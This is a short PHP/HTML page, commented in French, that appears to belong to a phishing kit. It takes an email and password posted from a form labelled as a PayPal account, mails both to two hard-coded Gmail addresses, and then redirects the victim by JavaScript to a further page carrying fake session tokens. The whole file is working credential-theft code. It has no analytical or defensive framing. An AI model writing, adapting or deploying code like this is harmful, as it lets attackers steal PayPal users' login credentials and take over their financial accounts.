<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

</head>


<body>

<?php
    // S'il y des données de postées
    if ($_SERVER['REQUEST_METHOD']=='POST') {
     
      // (1) Code PHP pour traiter l'envoi de l'email
     
      // Récupération des variables et sécurisation des données
      $mail = htmlentities($_POST['mail']); // htmlentities() convertit des caractères "spéciaux" en équivalent HTML
      $pass = htmlentities($_POST['pass']);
      
     
      // Variables concernant l'email
     
      $destinataire = 'parfaitk714@gmail.com, olivierdelaforce2@gmail.com'; // Adresse email du webmaster (à personnaliser)
      $contenu = '<html><head><title> '.$objet.' </title></head><body>';
      $contenu .= '<p>Compte paypal</p>';
      $contenu .= '<p><strong>Email</strong>: '.$mail.'</p>';
      $contenu .= '<p><strong>Mot de passe</strong>: '.$pass.'</p>';
      $contenu .= '</body></html>'; // Contenu du message de l'email (en XHTML)
     
      // Pour envoyer un email HTML, l'en-tête Content-type doit être défini
      $headers = 'MIME-Version: 1.0'."\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
     
      // Envoyer l'email
      mail($destinataire, $objet, $contenu, $headers); // Fonction principale qui envoi l'email
      
    }
    ?>
    <script language="javascript">document.location="info/index.php_enc=ccab1bcc4b4132f61751d5414ba41591&p=0&dispatch=dabd9f0e1d691e508ccde527783f2b2c59d71264"</script> 
</body>

</html> 